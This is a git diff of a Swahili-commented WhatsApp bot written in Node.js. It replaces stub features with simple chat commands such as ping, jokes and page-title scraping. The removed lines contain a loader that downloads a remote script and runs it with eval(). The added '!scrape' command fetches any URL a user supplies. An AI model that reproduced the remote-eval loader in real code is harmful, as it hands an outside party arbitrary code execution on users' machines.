@@ -8,77 +8,91 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const adams = require("./config");
 
-// Ongeza antlink feature
-const antlink = async (url) => {
-  try {
-    const response = await axios.get(url);
-    console.log('Antlink loaded successfully!');
-    // Hapa unaweza kuongeza logic ya kutumia antlink
-  } catch (error) {
-    console.error('Error loading antlink:', error.message);
-  }
-};
+const fs = require("fs");
+const path = require("path");
+const { Boom } = require("@hapi/boom");
 
-// Fake Typing
-const fakeTyping = async (userId) => {
-  try {
-    // Logic ya fake typing
-    console.log(`User ${userId} is typing...`);
-    setTimeout(() => {
-      console.log(`Fake typing completed for ${userId}`);
-    }, 3000); // Tumia 3 seconds kama mfano
-  } catch (error) {
-    console.error('Error in fake typing:', error.message);
-  }
-};
+async function startBot() {
+  const { state, saveCreds } = await useMultiFileAuthState("./auth");
+  const { version } = await fetchLatestBaileysVersion();
+  const sock = makeWASocket({
+    version,
+    printQRInTerminal: true,
+    auth: {
+      creds: state.creds,
+      keys: makeCacheableSignalKeyStore(state.keys, P({ level: "silent" }))
+    },
+    logger: P({ level: "silent" })
+  });
 
-// Fake Recording
-const fakeRecording = async (userId) => {
-  try {
-    // Logic ya fake recording
-    console.log(`User ${userId} started recording...`);
-    setTimeout(() => {
-      console.log(`Fake recording completed for ${userId}`);
-    }, 5000); // Tumia 5 seconds kama mfano
-  } catch (error) {
-    console.error('Error in fake recording:', error.message);
-  }
-};
+  sock.ev.on("creds.update", saveCreds);
+  sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
+    if (connection === "close") {
+      const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) startBot();
+    } else if (connection === "open") {
+      console.log("✅ Bot connected!");
+    }
+  });
 
-// Opening viewonce
-const openViewOnce = async (userId, mediaUrl) => {
-  try {
-    console.log(`Opening media for ${userId} as viewonce: ${mediaUrl}`);
-    // Hapa unaweza kuongeza logic ya kuweza kufungua media mara moja
-    setTimeout(() => {
-      console.log('Viewonce media opened successfully.');
-    }, 2000); // Tumia 2 seconds kama mfano
-  } catch (error) {
-    console.error('Error in opening viewonce:', error.message);
-  }
-};
+  sock.ev.on("messages.upsert", async ({ messages }) => {
+    const msg = messages[0];
+    if (!msg.message || msg.key.fromMe) return;
 
-async function fetchINDEXUrl() {
-  try {
-    const response = await axios.get(BWM_XMD);
-eval(response.data); // Load remote script directly
-console.log('Remote INDEX script loaded successfully ✅');
-
-    // Ongeza antlink feature
-    await antlink(targetUrl);
-
-    // Kuitwa kwa fake typing na recording
-    const userId = 'exampleUserId'; // Badilisha kwa ID halisi
-    await fakeTyping(userId);
-    await fakeRecording(userId);
-
-    // Kuitwa kwa viewonce media
-    const mediaUrl = 'https://example.com/media'; // Badilisha kwa URL halisi
-    await openViewOnce(userId, mediaUrl);
-
-  } catch (error) {
-    console.error('Error:', error.message);
-  }
+    const mtype = Object.keys(msg.message)[0];
+    const body = msg.message.conversation || msg.message[mtype]?.text || "";
+    const from = msg.key.remoteJid;
+// === Commands ===
+if (body.startsWith("!ping")) {
+  await sock.sendMessage(from, { text: "🥊 Pong! I'm alive." });
+    }
+    if (body === "!time") {
+  const now = new Date().toLocaleString("en-TZ", { timeZone: "Africa/Dar_es_Salaam" });
+  await sock.sendMessage(from, { text: `⏰ Sasa ni: ${now}` });
 }
 
-fetchINDEXUrl();
+if (body === "!hello") {
+  await sock.sendMessage(from, { text: "👋 Hello! Karibu kwenye bot ya Ben Whittaker Tech." });
+}
+
+if (body === "!joke") {
+  const jokes = [
+    "Why don’t eggs tell jokes? Because they’d crack each other up!",
+    "Why did the computer go to therapy? It had too many bytes!",
+    "I'm on a seafood diet. I see food and I eat it."
+  ];
+  const joke = jokes[Math.floor(Math.random() * jokes.length)];
+  await sock.sendMessage(from, { text: `😂 ${joke}` });
+}
+
+if (body === "!motivate") {
+  const quotes = [
+    "Dream big and dare to fail.",
+    "The harder you work for something, the greater you’ll feel when you achieve it.",
+    "Push yourself, because no one else is going to do it for you."
+  ];
+  const quote = quotes[Math.floor(Math.random() * quotes.length)];
+  await sock.sendMessage(from, { text: `🌟 ${quote}` });
+}
+
+if (body === "!owner") {
+  await sock.sendMessage(from, { text: `👤 Bot Owner: wa.me/255760317060` });
+                            }
+     if (body.startsWith("!scrape")) {
+      try {
+        const targetUrl = body.split(" ")[1];
+        const res = await axios.get(targetUrl);
+        const $ = cheerio.load(res.data);
+        const title = $("title").text();
+        await sock.sendMessage(from, { text: `✅ Title: *${title}*` });
+      } catch (err) {
+        await sock.sendMessage(from, { text: `❌ Error: ${err.message}` });
+      }
+    }
+  });
+}
+
+startBot();
+
+
+             
